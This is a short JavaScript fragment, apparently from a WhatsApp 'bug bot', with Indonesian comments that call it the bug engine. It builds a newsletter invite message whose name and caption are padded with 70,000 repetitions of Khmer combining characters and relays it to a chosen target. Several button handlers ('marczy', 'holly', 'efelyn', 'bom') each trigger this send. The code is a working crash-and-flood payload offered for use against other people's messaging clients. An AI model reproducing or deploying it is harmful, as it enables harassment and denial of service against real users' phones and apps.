({
  

  ({
  // --- INI ADALAH LOGIKA UTAMA (MESIN BUGNYA) ---
  spam: async function(target, sock) {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: "☣ MARCZY BUG ☣" + "ោ៝".repeat(70000),
        caption: "Hi ./MarczyKill" + "ោ៝".repeat(70000),
        inviteExpiration: "999999999",
      },
    };
    
    await sock.relayMessage(target, msg, { 
      participant: { jid: target }, 
      messageId: null 
    });
  },

  // --- INI ADALAH PEMANGGILAN DARI TOMBOL ---
  
  marczy: async function(target, sock) {
    // Tombol Marczy menjalankan logika spam
    await this.spam(target, sock);
  },

  holly: async function(target, sock) {
    // Tombol Holly juga menjalankan logika spam
    await this.spam(target, sock);
  },

  efelyn: async function(target, sock) {
    // Bisa ditambah jeda atau variasi kalau mau
    await this.spam(target, sock);
  },

  bom: async function(target, sock) {
    await this.spam(target, sock);
  }
})
})
